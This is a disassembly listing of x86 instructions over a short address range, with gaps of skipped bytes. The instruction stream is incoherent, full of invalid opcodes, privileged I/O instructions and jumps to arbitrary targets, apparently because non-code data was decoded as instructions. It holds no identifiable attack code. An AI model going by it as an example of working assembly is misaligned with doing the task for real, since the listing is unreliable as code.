  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x14b09bc5]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	inc    esi
  429f8d:	xor    esp,edx
  429f8f:	outs   dx,DWORD PTR ds:[esi]
  429f90:	fs xchg edx,eax
  429f92:	xor    DWORD PTR [edi*1+0x37905f7],esi
  429f99:	sub    eax,0xac1
  429f9e:	xor    DWORD PTR [ebx+0x56],edi
  429fa1:	push   edx
  429fa2:	adc    ecx,DWORD PTR [ebx+0x29]
  429fa5:	scas   al,BYTE PTR es:[edi]
  429fa6:	dec    ebp
  429fa7:	imul   esi,DWORD PTR [ebp-0x659ac8c],0xffffffec
  429fae:	ss sbb eax,0xc22f5903
  429fb4:	adc    al,0x5a
  429fb6:	mov    ah,0xb4
  429fb8:	std    
  429fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fba:	sbb    DWORD PTR [edx],0xb95e3476
  429fc0:	xor    DWORD PTR [esi+0x57],ecx
  429fc3:	pusha  
  429fc4:	out    0x5f,eax
  429fc6:	aam    0x86
  429fc8:	sub    BYTE PTR [edx+eiz*4-0xa],bl
  429fcc:	adc    ah,0x1e
  429fcf:	arpl   WORD PTR ds:0x4bc9acae,di
  429fd5:	fcom   DWORD PTR [edx+edx*8]
  429fd8:	ret    
  429fd9:	pop    edx
  429fda:	pop    eax
  429fdb:	bnd jbe 0x429fd4
  429fde:	les    esp,FWORD PTR [edi]
  429fe0:	dec    esi
  429fe1:	pop    ss
  429fe2:	aaa    
  429fe3:	push   esp
  429fe4:	pop    eax
  429fe5:	cdq    
  429fe6:	adc    BYTE PTR [edx+ebx*2+0x4bc04c7d],ah
  429fed:	xor    DWORD PTR [edx-0x8],0x5a
  429ff1:	jb     0x429fb3
  429ff3:	dec    esp
  429ff4:	cmp    ch,BYTE PTR [edx]
  429ff6:	dec    edi
  429ff7:	jp     0x429f83
  429ff9:	adc    BYTE PTR [eax+0x46],0x43
  429ffd:	jne    0x429fca
  429fff:	mov    ds:0x19b81922,eax
  42a004:	call   0xd83e:0xabfe031
  42a00b:	fisubr WORD PTR [edi-0x1e1eca2c]
  42a011:	mov    cl,BYTE PTR [edi+0x53]
  42a014:	push   eax
  42a015:	mov    al,0x2a
  42a017:	and    bh,BYTE PTR [ebx+0x72]
  42a01a:	inc    esp
  42a01b:	push   ebp
  42a01c:	mov    ebp,0x771479b0
  42a021:	or     eax,0x48638938
  42a026:	mov    edx,0x32be31f
  42a02b:	mov    ebp,0x56b43b25
  42a030:	fwait
  42a031:	mov    edi,0x7aa54074
  42a036:	add    ch,BYTE PTR [edi+edi*2+0x65fd5e5]
  42a03d:	dec    edi
  42a03e:	cmp    esp,DWORD PTR [edx-0x68]
  42a041:	lods   eax,DWORD PTR ds:[esi]
  42a042:	jecxz  0x42a0a4
  42a044:	jns    0x429fd6
  42a046:	add    cl,BYTE PTR [edi-0x2f6d54c1]
  42a04c:	jnp    0x429fe3
  42a04e:	ja     0x42a0c2
  42a050:	sub    al,0xce
  42a052:	dec    esi
  42a053:	cmp    DWORD PTR [eax-0x434f80d6],0xd12ee742
  42a05d:	dec    esp
  42a05e:	imul   ecx,ebx,0xfffffffa
  42a061:	or     ah,BYTE PTR [eax-0x7a657070]
  42a067:	dec    edx
  42a068:	fwait
  42a069:	imul   esp,DWORD PTR [edx-0xf],0xfffffff1
  42a06d:	icebp  
  42a06e:	add    al,0xec
  42a070:	fild   QWORD PTR [eax+0x3bb7315a]
  42a076:	repz pop ebx
  42a078:	(bad)  
  42a079:	push   esi
  42a07a:	xor    al,0xc5
  42a07c:	adc    BYTE PTR [eax],bh
  42a07e:	imul   ecx,DWORD PTR [ebp-0x75772f2f],0x62a51df0
  42a088:	sti    
  42a089:	pop    es
  42a08a:	mov    ds:0x33e93d66,al
  42a08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	sub    ch,BYTE PTR [edi+0x5d]
  42a103:	mov    esi,0x1c18c
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	lods   al,BYTE PTR ds:[esi]
  42a10d:	adc    eax,0x70da4473
  42a112:	scas   eax,DWORD PTR es:[edi]
  42a113:	(bad)  
  42a115:	push   0xe36c65e3
  42a11a:	or     DWORD PTR [edi-0x63],eax
  42a11d:	dec    ebx
  42a11e:	xchg   DWORD PTR [edi+0x3934370e],ebp
  42a124:	ffreep st(2)
  42a126:	sub    BYTE PTR [edi-0x19],bl
  42a129:	jne    0x42a148
  42a12b:	out    0x39,al
  42a12d:	ja     0x42a109
  42a12f:	neg    BYTE PTR [edi-0x384080a8]
  42a135:	and    al,0x46
  42a137:	sbb    al,0x52
  42a139:	or     al,0x37
  42a13b:	lds    ebx,FWORD PTR [ebx+eiz*1-0x15835600]
  42a142:	imul   esi,DWORD PTR [ebp+0x52c06df4],0xc5a078c6
  42a14c:	out    0xd,eax
  42a14e:	jae    0x42a0df
  42a150:	xchg   edx,eax
  42a151:	lea    edi,[eax-0x5f]
  42a154:	xchg   esp,eax
  42a155:	fnstenv [eax]
  42a157:	aad    0x97
  42a159:	pushf  
  42a15a:	pop    esi
  42a15b:	ret    
  42a15c:	mov    dl,0xe
  42a15e:	fstp   QWORD PTR [ebx]
  42a160:	(bad)  
  42a161:	lods   eax,DWORD PTR ds:[esi]
  42a162:	lock xchg BYTE PTR [esi-0x4e],ah
  42a166:	outs   dx,BYTE PTR ds:[esi]
  42a167:	rcr    DWORD PTR [edi+0x1f923c77],1
  42a16d:	push   cs
  42a16e:	sbb    BYTE PTR [edi+0x67],ah
  42a171:	das    
  42a172:	adc    DWORD PTR [esi-0x63b333a9],edx
  42a178:	mov    esi,0x366ce6af
  42a17d:	shl    BYTE PTR [edi-0x4996101b],0xf4
  42a184:	xor    eax,0x474d0efd
  42a189:	adc    eax,0xb65a4845
  42a18e:	xchg   DWORD PTR [edi+edi*8-0x2bfb98b3],eax
  42a195:	sub    ch,BYTE PTR [ebp+0x16]
  42a198:	enter  0xbafc,0x6d
  42a19c:	adc    BYTE PTR [ebx-0xa],cl
  42a19f:	push   esp
  42a1a0:	lds    eax,FWORD PTR [edx-0xe]
  42a1a3:	loop   0x42a1ec
  42a1a5:	jo     0x42a129
  42a1a7:	push   eax
  42a1a8:	gs fmul st(4),st
  42a1ab:	jmp    0x394df3a6
  42a1b0:	iret   
  42a1b1:	xor    BYTE PTR [ebx+ebx*1-0x7c634327],ah
  42a1b8:	ss pushf 
  42a1ba:	xor    bl,bh
  42a1bc:	ins    BYTE PTR es:[edi],dx
  42a1bd:	xchg   ebp,eax
  42a1be:	pop    eax
  42a1bf:	inc    esi
  42a1c0:	mov    cl,0x73
  42a1c2:	loop   0x42a22d
  42a1c4:	daa    
  42a1c5:	fstp   QWORD PTR [ebx-0x2bc730e]
  42a1cb:	and    dl,ch
  42a1cd:	and    dh,bh
  42a1cf:	jb     0x42a213
  42a1d1:	(bad)  
  42a1d2:	in     al,dx
  42a1d3:	dec    esp
  42a1d4:	fistp  WORD PTR [ebx+0x74]
  42a1d7:	fstp   TBYTE PTR [ebx]
  42a1d9:	push   eax
  42a1da:	and    BYTE PTR [ebx+0x39183631],dl
  42a1e0:	and    ah,cl
  42a1e2:	data16 int3 
  42a1e4:	shl    BYTE PTR [eax+0x4a712c21],0x87
  42a1eb:	xchg   edi,eax
  42a1ec:	stos   BYTE PTR es:[edi],al
  42a1ed:	fdiv   DWORD PTR [esi+0x5e2f45c3]
  42a1f3:	pop    edi
  42a1f4:	rcr    BYTE PTR [ebp-0x77],0xe0
  42a1f8:	mov    ebx,0xc2d72fe6
  42a1fd:	sbb    dl,al
  42a1ff:	push   ss
  42a200:	adc    al,0xae
  42a202:	lds    edi,FWORD PTR gs:[ebp+0x2a]
  42a206:	jbe    0x42a229
  42a208:	pop    ebp
  42a209:	(bad)  
  42a20a:	jns    0x42a20c
  42a20c:	sti    
  42a20d:	ror    esi,cl
  42a20f:	inc    BYTE PTR [eax]
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldenv [eax-0x6f9e90b8]
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	int3   
  42a28d:	pop    eax
  42a28e:	outs   dx,BYTE PTR ds:[esi]
  42a28f:	lds    eax,FWORD PTR [edx-0x4b4f94e7]
  42a295:	or     al,0xd6
  42a297:	mov    BYTE PTR [edi-0x27920f51],dh
  42a29d:	mov    ah,0x7
  42a29f:	dec    ebx
  42a2a0:	push   eax
  42a2a1:	and    BYTE PTR [eax-0x648b2d00],ah
  42a2a7:	call   0x7f0e6ff0
  42a2ac:	sti    
  42a2ad:	(bad)  
  42a2ae:	lea    edx,[esi+0xf0dcf87]
  42a2b4:	xor    edi,DWORD PTR [ebx-0x4413b5b9]
  42a2ba:	mov    ecx,0x2ae24f51
  42a2bf:	out    dx,eax
  42a2c0:	sar    DWORD PTR cs:[eax],0xf3
  42a2c4:	hlt    
  42a2c5:	call   0x31e72ce6
  42a2ca:	frstor [ebx+0x40986c32]
  42a2d0:	fdiv   st(2),st
  42a2d2:	(bad)  
  42a2d3:	cwde   
  42a2d4:	xchg   BYTE PTR [esp+eax*1],dl
  42a2d7:	pop    es
  42a2d8:	fwait
  42a2d9:	sbb    al,0xf1
  42a2db:	int    0xbf
  42a2dd:	xor    BYTE PTR [ebp-0x7cea5226],dh
  42a2e3:	push   ebp
  42a2e4:	add    eax,0x3696e7f
  42a2e9:	xor    eax,0xc44a5312
  42a2ee:	inc    edx
  42a2ef:	mov    ebx,0x97b6a65a
  42a2f4:	mov    gs,edx
  42a2f6:	and    DWORD PTR [ecx],esp
  42a2f8:	mov    ch,0xe1
  42a2fa:	cmp    eax,0x52b907ba
  42a2ff:	repz scas eax,DWORD PTR es:[edi]
  42a301:	or     dh,ah
  42a303:	daa    
  42a304:	cmp    cl,BYTE PTR [ebx+0x4df99ce2]
  42a30a:	popf   
  42a30b:	in     al,0x61
  42a30d:	add    eax,0x1184a466
  42a312:	cs sbb edx,ebp
  42a315:	mov    bl,0x85
  42a317:	ret    
  42a318:	dec    edx
  42a319:	pop    edi
  42a31a:	je     0x42a2c5
  42a31c:	call   0x603e:0x2292d41c
  42a323:	push   esp
  42a324:	sub    al,0x93
  42a326:	(bad)  [ecx]
  42a328:	fdivr  DWORD PTR [ecx+0xd]
  42a32b:	test   eax,0x88097456
  42a330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a331:	mov    cl,0x77
  42a333:	xchg   esp,eax
  42a334:	sbb    dh,BYTE PTR [ecx+0x198128ba]
  42a33a:	sub    esp,DWORD PTR [edi]
  42a33c:	add    DWORD PTR ds:0x1247d4ab,edi
  42a342:	sub    eax,0x13540cfc
  42a347:	sub    BYTE PTR [ebx-0x1d],0xa
  42a34b:	jecxz  0x42a310
  42a34d:	aam    0x72
  42a34f:	jl     0x42a302
  42a351:	arpl   WORD PTR [ebx-0x77],si
  42a354:	sub    DWORD PTR [ecx+0x58],ebx
  42a357:	(bad)  
  42a358:	and    eax,0xb1b30b4d
  42a35d:	mov    DWORD PTR [eax-0x49],0x2b6d123c
  42a364:	cmc    
  42a365:	dec    esi
  42a366:	dec    ebx
  42a367:	xchg   edi,eax
  42a368:	cmp    BYTE PTR [ebx-0x58965552],al
  42a36e:	sub    al,0xca
  42a370:	sub    DWORD PTR ds:0xae4154e2,edx
  42a376:	xor    ebp,DWORD PTR [edi+0x4b2d6925]
  42a37c:	(bad)  
  42a37d:	mov    eax,0x84167690
  42a382:	pusha  
  42a383:	and    DWORD PTR [eax],edx
  42a385:	into   
  42a386:	cs mov edx,0x4718808c
  42a38c:	sbb    DWORD PTR [edi],esp
  42a38e:	les    esp,FWORD PTR [esi+0x0]
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xcc09e23d
  42a403:	xchg   ebp,eax
  42a404:	xchg   esp,eax
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a40d:	push   edi
  42a40e:	mov    esp,0x4ac7898f
  42a413:	lea    edx,[ebp-0x3c08595a]
  42a419:	cmp    eax,0x521ab595
  42a41e:	or     al,BYTE PTR [ebx]
  42a420:	aam    0x9
  42a422:	aam    0x81
  42a424:	dec    esp
  42a425:	jp     0x42a454
  42a427:	and    DWORD PTR [ebp+0x6945b10a],edi
  42a42d:	sub    ch,ch
  42a42f:	jecxz  0x42a474
  42a431:	cmp    ch,BYTE PTR [esi+0x53aad69b]
  42a437:	stos   DWORD PTR es:[edi],eax
  42a438:	pop    edi
  42a439:	dec    esp
  42a43a:	ja     0x42a45e
  42a43c:	and    eax,0x5c37aa84
  42a441:	pop    DWORD PTR [ecx]
  42a443:	scas   al,BYTE PTR es:[edi]
  42a444:	out    dx,al
  42a445:	loopne 0x42a453
  42a447:	push   cs
  42a448:	pop    ecx
  42a449:	in     al,dx
  42a44a:	fs (bad) 
  42a44c:	pushf  
  42a44d:	daa    
  42a44e:	(bad)  
  42a44f:	adc    dh,BYTE PTR ds:[edi]
  42a452:	sub    eax,0x74a996ec
  42a457:	nop
  42a458:	dec    ebp
  42a459:	cmp    dh,BYTE PTR [bp+si]
  42a45c:	(bad)  
  42a45d:	cli    
  42a45e:	jmp    0x42a3e0
  42a460:	call   0xb86b:0x3d87914e
  42a467:	out    dx,eax
  42a468:	inc    ebp
  42a469:	and    cl,bl
  42a46b:	scas   al,BYTE PTR es:[edi]
  42a46c:	int3   
  42a46d:	(bad)  
  42a46e:	sbb    bl,0xe
  42a471:	shl    DWORD PTR [edx+0x4],cl
  42a474:	cmp    al,0x0
  42a476:	stos   DWORD PTR es:[edi],eax
  42a477:	xchg   esi,eax
  42a478:	scas   eax,DWORD PTR es:[edi]
  42a479:	or     DWORD PTR [edi],0x22fb3fb6
  42a47f:	jno    0x42a4a3
  42a481:	inc    esp
  42a482:	js     0x42a477
  42a484:	lock clc 
  42a486:	dec    edi
  42a487:	and    DWORD PTR [esi-0xa180aa6],ecx
  42a48d:	xor    esi,DWORD PTR [ecx+0x2a]
  42a490:	lods   eax,DWORD PTR ds:[esi]
  42a491:	out    dx,eax
  42a492:	(bad)  
  42a493:	mov    al,0x2f
  42a495:	or     eax,0xb7319a50
  42a49a:	sti    
  42a49b:	mov    cs,edi
  42a49d:	(bad)  
  42a49e:	aaa    
  42a49f:	adc    esp,eax
  42a4a1:	lea    esi,[eax+0x2d]
  42a4a4:	jg     0x42a437
  42a4a6:	int3   
  42a4a7:	(bad)  
  42a4a8:	jnp    0x42a527
  42a4aa:	mov    ch,0xd3
  42a4ac:	xor    ebx,edx
  42a4ae:	sbb    bh,al
  42a4b0:	mov    ch,0x1d
  42a4b2:	add    bl,BYTE PTR [edi-0x58fecae3]
  42a4b8:	mov    ah,BYTE PTR [ebx]
  42a4ba:	icebp  
  42a4bb:	jns    0x42a4a6
  42a4bd:	mov    bl,0x32
  42a4bf:	jnp    0x42a536
  42a4c1:	lods   al,BYTE PTR ds:[esi]
  42a4c2:	xor    bh,BYTE PTR ds:0x9ae33c6d
  42a4c8:	mov    dh,0x3a
  42a4ca:	or     BYTE PTR [ebp+0x2ad022b],ah
  42a4d0:	xchg   esp,eax
  42a4d1:	sub    edx,edx
  42a4d3:	xchg   ebx,eax
  42a4d4:	push   ss
  42a4d5:	push   es
  42a4d6:	xor    DWORD PTR [eax],esp
  42a4d8:	pop    ds
  42a4d9:	cmc    
  42a4da:	xor    dh,BYTE PTR [edi-0x71dce856]
  42a4e0:	and    al,0x3
  42a4e2:	rcr    DWORD PTR [edx+ecx*8],0x2
  42a4e6:	(bad)  
  42a4e7:	fnsave [eax+0x20]
  42a4ea:	inc    ebx
  42a4eb:	mov    ebp,0x62aacb3c
  42a4f0:	mov    esp,ecx
  42a4f2:	jge    0x42a491
  42a4f4:	popf   
  42a4f5:	cmp    al,0xf3
  42a4f7:	dec    ebx
  42a4f8:	jl     0x42a568
  42a4fa:	sub    eax,edx
  42a4fc:	mov    ah,BYTE PTR [ecx+ecx*1]
  42a4ff:	pop    ecx
  42a500:	sbb    ebp,DWORD PTR [ebx]
  42a502:	(bad)  
  42a504:	gs adc al,cl
  42a507:	jmp    0x26fe9202
  42a50c:	stos   DWORD PTR es:[edi],eax
  42a50d:	loope  0x42a4e9
  42a50f:	inc    ebx
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x68a3979f
  42a583:	mov    edx,0x1c498
  42a588:	add    al,0x1
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	push   edi
  42a58d:	jecxz  0x42a5b2
  42a58f:	gs cmc 
  42a591:	out    dx,eax
  42a592:	fild   QWORD PTR [edi]
  42a594:	mov    BYTE PTR [esi],ah
  42a596:	fs add edi,esp
  42a599:	mov    bl,BYTE PTR [ebp+ebx*4-0x67]
  42a59d:	push   cs
  42a59e:	xchg   BYTE PTR ds:0xe8850388,ah
  42a5a4:	call   DWORD PTR [esi]
  42a5a6:	enter  0x8b38,0x9e
  42a5aa:	(bad)  
  42a5ab:	jg     0x42a5a9
  42a5ad:	je     0x42a602
  42a5af:	mov    eax,ds:0x9be967f6
  42a5b4:	xor    ecx,DWORD PTR [ebp-0x31]
  42a5b7:	loop   0x42a59c
  42a5b9:	push   es
  42a5ba:	push   ebx
  42a5bb:	sbb    edx,DWORD PTR ds:0xbe0497a3
  42a5c1:	mov    ds:0xdf102131,al
  42a5c6:	push   ss
  42a5c7:	xchg   BYTE PTR [ebx-0x7cb3765a],al
  42a5cd:	mov    ebp,0x7c705bdd
  42a5d2:	rcl    edi,cl
  42a5d4:	mov    ecx,0x3deb3bd5
  42a5d9:	xchg   eax,edx
  42a5db:	cli    
  42a5dc:	rol    dl,cl
  42a5de:	mov    gs,WORD PTR [ebp+0x60b9d2da]
  42a5e4:	aam    0x15
  42a5e6:	(bad)  
  42a5e8:	mov    ds:0x9bcfc596,eax
  42a5ed:	jnp    0x42a636
  42a5ef:	(bad)  
  42a5f0:	or     DWORD PTR [ebx+0x483d84e9],edi
  42a5f6:	std    
  42a5f7:	adc    edx,DWORD PTR [eax+0x6ea6c8f7]
  42a5fd:	leave  
  42a5fe:	icebp  
  42a5ff:	inc    ebp
  42a600:	inc    ebx
  42a601:	pop    ecx
  42a602:	stc    
  42a603:	mov    ebx,0x6ca681e2
  42a608:	daa    
  42a609:	ja     0x42a5aa
  42a60b:	sbb    BYTE PTR [esi+0x11539bc4],cl
  42a611:	int3   
  42a612:	mov    edi,0x147926e
  42a617:	loope  0x42a610
  42a619:	jl     0x42a5d9
  42a61b:	xor    eax,0xf4b9277d
  42a620:	ins    BYTE PTR es:[edi],dx
  42a621:	mov    ah,BYTE PTR ds:0x654cbfa7
  42a627:	xchg   esp,eax
  42a628:	sbb    eax,0x194a0498
  42a62d:	fwait
  42a62e:	jge    0x42a66e
  42a630:	mov    dl,0xa8
  42a632:	bound  esp,QWORD PTR [eax-0x7d]
  42a635:	jnp    0x42a631
  42a637:	or     BYTE PTR [edx+0x43f5dd79],al
  42a63d:	retf   
  42a63e:	(bad)
  42a641:	clc    
  42a642:	test   al,0x25
  42a644:	pop    esi
  42a645:	loop   0x42a698
  42a647:	mov    al,ah
  42a649:	xchg   ebp,eax
  42a64a:	loop   0x42a5f9
  42a64c:	lods   al,BYTE PTR ds:[esi]
  42a64d:	sub    DWORD PTR [edi],edi
  42a64f:	call   0xbfa:0x69603fed
  42a656:	fsubr  DWORD PTR [eax+ebx*2-0x55d76aa8]
  42a65d:	jo     0x42a6c5
  42a65f:	push   ebx
  42a660:	inc    ebx
  42a661:	dec    esi
  42a662:	mov    WORD PTR [ebx+0x6e],?
  42a665:	xchg   esp,eax
  42a666:	arpl   bp,di
  42a668:	and    dh,BYTE PTR [edx+eiz*4+0x34]
  42a66c:	lods   al,BYTE PTR ds:[esi]
  42a66d:	xor    bl,al
  42a66f:	adc    dl,BYTE PTR [ebx+0x54]
  42a672:	pop    ss
  42a673:	mov    ds:0x3cedb0eb,eax
  42a678:	lahf   
  42a679:	add    al,0xca
  42a67b:	add    dh,al
  42a67d:	jecxz  0x42a661
  42a67f:	pop    ebp
  42a680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a681:	imul   ebp,DWORD PTR [eax],0xffffffa2
  42a684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a685:	pop    edx
  42a686:	inc    eax
  42a687:	xchg   esp,esi
  42a689:	bnd jae 0x42a6cf
  42a68c:	jae    0x42a6ec
  42a68e:	fadd   QWORD PTR [eax+eax*1+0x0]
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x38b8131c],0x9c7db71d
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	into   
  42a70d:	cmp    BYTE PTR [edi+edx*4],bh
  42a710:	cs pop ebp
  42a712:	bound  esp,QWORD PTR [ebx+0x734029eb]
  42a718:	(bad)  
  42a71a:	jmp    0xb9b4cf58
  42a71f:	outs   dx,BYTE PTR ds:[esi]
  42a720:	cmc    
  42a721:	pop    ds
  42a722:	sbb    BYTE PTR [edx-0x2],dl
  42a725:	xchg   edi,eax
  42a726:	leave  
  42a727:	inc    ebp
  42a728:	push   ds
  42a729:	fisttp WORD PTR [esi]
  42a72b:	dec    eax
  42a72c:	mul    DWORD PTR [edi]
  42a72e:	mov    bh,0x80
  42a730:	push   esi
  42a731:	mov    esi,0xb32e486e
  42a736:	lahf   
  42a737:	xor    eax,0xb8778635
  42a73c:	leave  
  42a73d:	ja     0x42a73b
  42a73f:	mov    WORD PTR [edx-0x4741a9f4],gs
  42a745:	popa   
  42a746:	xor    al,0xcb
  42a748:	push   ecx
  42a749:	(bad)  
  42a74c:	jne    0x42a708
  42a74e:	retf   
  42a74f:	xlat   BYTE PTR ds:[ebx]
  42a750:	pushf  
  42a751:	je     0x42a6e5
  42a753:	adc    al,0x22
  42a755:	data16 jno 0x42a771
  42a758:	xor    al,0x43
  42a75a:	jb     0x42a6e9
  42a75c:	call   0x559a:0x126661f4
  42a763:	xor    cl,dh
  42a765:	neg    al
  42a767:	mov    DWORD PTR [edi-0x533959c8],esi
  42a76d:	sub    al,0xe6
  42a76f:	or     DWORD PTR [edi],ebp
  42a771:	xchg   ebp,eax
  42a772:	cmp    eax,0x49123602
  42a777:	xor    eax,0x4b50fe33
  42a77c:	je     0x42a78a
  42a77e:	out    0x2d,eax
  42a780:	lock cmp BYTE PTR [ebp+0x14],bl
  42a784:	adc    BYTE PTR [ebp-0x1ea014b6],bl
  42a78a:	imul   edx,DWORD PTR [ebp+0xd91c3a5],0x47
  42a791:	rol    BYTE PTR [ecx-0x624d3b09],cl
  42a797:	mov    edi,0xca0636d9
  42a79c:	daa    
  42a79d:	fmulp  st(6),st
  42a79f:	jbe    0x42a809
  42a7a1:	out    dx,al
  42a7a2:	nop
  42a7a3:	repnz mov eax,0xac622bf0
  42a7a9:	fbstp  TBYTE PTR [eax]
  42a7ab:	adc    BYTE PTR [ebp+0x26],ch
  42a7ae:	in     al,dx
  42a7af:	push   ecx
  42a7b0:	enter  0x3dd1,0x1
  42a7b4:	inc    edx
  42a7b5:	and    al,0x10
  42a7b7:	cmp    DWORD PTR [edi+0x1d5b9831],ecx
  42a7bd:	outs   dx,BYTE PTR ds:[esi]
  42a7be:	fdivr  QWORD PTR [edi]
  42a7c0:	mov    bl,0xb9
  42a7c2:	ins    BYTE PTR es:[edi],dx
  42a7c3:	sbb    ah,BYTE PTR ds:0xb7afdfd0
  42a7c9:	sub    DWORD PTR [ebp+0x25],ecx
  42a7cc:	test   al,0x12
  42a7ce:	or     eax,0x78abfd62
  42a7d3:	out    0xa7,al
  42a7d5:	stos   DWORD PTR es:[edi],eax
  42a7d6:	sahf   
  42a7d7:	retf   0x4833
  42a7da:	push   0x6dba3f7d
  42a7df:	and    eax,0x29371bc7
  42a7e4:	jne    0x42a807
  42a7e6:	fdiv   QWORD PTR [eax+eax*8-0x5b]
  42a7ea:	mov    edi,0xf9877741
  42a7ef:	cmp    al,BYTE PTR [esi]
  42a7f1:	loope  0x42a7cb
  42a7f3:	inc    esi
  42a7f4:	es repnz and edx,esp
  42a7f8:	ins    DWORD PTR es:[edi],dx
  42a7f9:	retf   0xf7e9
  42a7fc:	(bad)  
  42a7fe:	mov    ds:0xd09584f,al
  42a803:	xor    DWORD PTR [esi-0x22],ecx
  42a806:	test   BYTE PTR [ebp-0x3062fab8],cl
  42a80c:	out    0x28,eax
  42a80e:	(bad)  
  42a80f:	iret   
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x954e6c97
  42a882:	jle    0x42a8e1
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [ebx],cl
  42a88d:	fucompp 
  42a88f:	sbb    BYTE PTR [edi-0x50],dl
  42a892:	and    al,BYTE PTR [esi]
  42a894:	jp     0x42a8b9
  42a896:	cli    
  42a897:	inc    esp
  42a898:	lods   eax,DWORD PTR ds:[esi]
  42a899:	shl    DWORD PTR [edi],0x23
  42a89c:	sbb    ah,BYTE PTR [edi+0x4ff8698]
  42a8a2:	push   ss
  42a8a3:	dec    esp
  42a8a4:	pusha  
  42a8a5:	sar    DWORD PTR [ecx],0x61
  42a8a8:	adc    eax,0x9165e913
  42a8ad:	or     al,0x81
  42a8af:	aas    
  42a8b0:	scas   al,BYTE PTR es:[edi]
  42a8b1:	mov    edi,0xed22f0b0
  42a8b6:	out    0xb0,al
  42a8b8:	clc    
  42a8b9:	sub    eax,DWORD PTR [edx]
  42a8bb:	in     al,0xa8
  42a8bd:	addr16 stc 
  42a8bf:	int3   
  42a8c0:	add    dh,BYTE PTR [ebp-0x3fbb2e8b]
  42a8c6:	or     BYTE PTR [ecx-0x3e],dl
  42a8c9:	xchg   esi,eax
  42a8ca:	pop    ds
  42a8cb:	icebp  
  42a8cc:	addr16 ds popa 
  42a8cf:	mov    edi,0xce107b6b
  42a8d4:	xor    esi,esp
  42a8d6:	mov    ebx,DWORD PTR [eax]
  42a8d8:	xchg   esp,eax
  42a8d9:	fisttp QWORD PTR [ecx]
  42a8db:	mov    ah,0x3b
  42a8dd:	jnp    0x42a86d
  42a8df:	cmp    al,0xc
  42a8e1:	and    eax,0xa20cb357
  42a8e6:	inc    DWORD PTR [ecx-0x5e]
  42a8e9:	cmp    edi,DWORD PTR [edx]
  42a8eb:	push   eax
  42a8ec:	mov    al,0x5a
  42a8ee:	lods   eax,DWORD PTR ds:[esi]
  42a8ef:	out    dx,eax
  42a8f0:	sub    ebp,DWORD PTR [ebx+ecx*1]
  42a8f3:	shl    DWORD PTR [esi-0x62],cl
  42a8f6:	icebp  
  42a8f7:	(bad)  
  42a8f8:	pop    esi
  42a8f9:	jbe    0x42a8b7
  42a8fb:	mov    eax,0xecf56377
  42a900:	fwait
  42a901:	add    bh,BYTE PTR [ebp-0x182fdf74]
  42a907:	sbb    al,0x31
  42a909:	push   eax
  42a90a:	cli    
  42a90b:	not    esi
  42a90d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a90e:	dec    ecx
  42a90f:	xlat   BYTE PTR ds:[ebx]
  42a910:	add    ch,BYTE PTR [esi+esi*8]
  42a913:	out    dx,eax
  42a914:	(bad)  
  42a915:	das    
  42a916:	or     dl,BYTE PTR [ecx+ecx*1+0x65]
  42a91a:	or     BYTE PTR [edi+eiz*2-0x7de1f48e],bl
  42a921:	fs inc esi
  42a923:	les    esp,FWORD PTR [ebp-0x43]
  42a926:	jg     0x42a9a0
  42a928:	fist   WORD PTR [ebx-0x42]
  42a92b:	imul   esi,DWORD PTR [esi+0x19],0xffffffd3
  42a92f:	out    dx,al
  42a930:	out    dx,al
  42a931:	push   edi
  42a932:	int3   
  42a933:	fcmovnbe st,st(0)
  42a935:	lahf   
  42a936:	dec    eax
  42a937:	(bad)  
  42a938:	sti    
  42a939:	mov    dl,0x8
  42a93b:	out    dx,al
  42a93c:	jbe    0x42a92d
  42a93e:	inc    esi
  42a93f:	arpl   WORD PTR [ebp-0x4a],dx
  42a942:	and    cl,al
  42a944:	add    DWORD PTR [esi],ebp
  42a946:	sub    ch,bl
